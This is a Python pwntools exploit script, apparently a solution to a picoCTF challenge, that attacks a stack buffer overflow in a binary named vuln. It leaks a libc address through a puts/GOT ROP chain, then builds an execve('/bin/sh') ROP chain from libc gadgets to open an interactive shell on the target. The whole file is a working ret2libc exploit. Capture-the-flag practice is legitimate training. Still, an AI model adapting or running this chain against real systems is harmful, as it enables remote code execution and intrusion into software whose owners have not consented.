#!/usr/bin/env python3

from pwn import *
from struct import pack

exe = ELF("./vuln_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe
context.log_level = "CRITICAL"
context.terminal = ["konsole", "-e"]

REMOTE = ("mercury.picoctf.net", 49464)

args.debug = True
args.local = True

class Exploit:
    def __init__(self):
        if args.local:
            self.process = "process()"
        else:
            self.process = "remote(REMOTE[0], REMOTE[1])"
        self.debug = args.debug

    def leak_libc(self, proc: process) -> int:
        '''get libc address leak via puts function'''
        payload = b'A'*112      # buffer
        payload += b'A'*24      # junk

        payload += pack("<Q", ROP(exe).find_gadget(['pop rdi', 'ret'])[0])
        payload += pack("<Q", exe.got['puts']) # Referece: https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html
        payload += pack("<Q", exe.plt['puts'])
        payload += pack("<Q", exe.symbols['main']) # return to main

        proc.sendline(payload)
        proc.recvline()

        p = proc.recv(6)
        p = int.from_bytes(p, byteorder="little")
        proc.recv(1024)
        
        return p-0x80a30 # -0x80a30 is from libc_base_address - libc_leaked address

    def execve_rop(self, proc: process, libc_base_address):
        '''forge the execve ROP chain'''
        payload = b'A'*112      # buffer
        payload += b'A'*24      # junk
        
        payload += pack("<Q", libc_base_address+ROP(libc).find_gadget(['pop rdi', 'ret'])[0])
        payload += pack("<Q", libc_base_address+next(libc.search(b"/bin/sh")))
        
        payload += pack("<Q", libc_base_address+ROP(libc).find_gadget(['pop rax', 'ret'])[0])
        payload += pack("<Q", 0x3b) # execve
        
        payload += pack("<Q", libc_base_address+ROP(libc).find_gadget(['pop rsi', 'ret'])[0])
        payload += pack("<Q", 0x0) # set rsi to NULL
        
        payload += pack("<Q", libc_base_address+ROP(libc).find_gadget(['pop rdx', 'ret'])[0])
        payload += pack("<Q", 0x0) # set rdx to NULL
        
        payload += pack("<Q", libc_base_address+ROP(libc).find_gadget(['syscall'])[0])
        
        proc.sendline(payload)
        # proc.recvline()
        proc.interactive()
        return

    def start(self):
        '''start the exploit'''
        with eval(self.process) as r:
            if self.debug:
                script = """
                break *main+298
                break *do_stuff+145
                continue
                """
                gdb.attach(r, gdbscript=script)
            
            r.recvuntil(b'sErVeR!\n')
            libc_base_address = self.leak_libc(r)
            self.execve_rop(r, libc_base_address)

if __name__ == "__main__":
    Exploit().start()
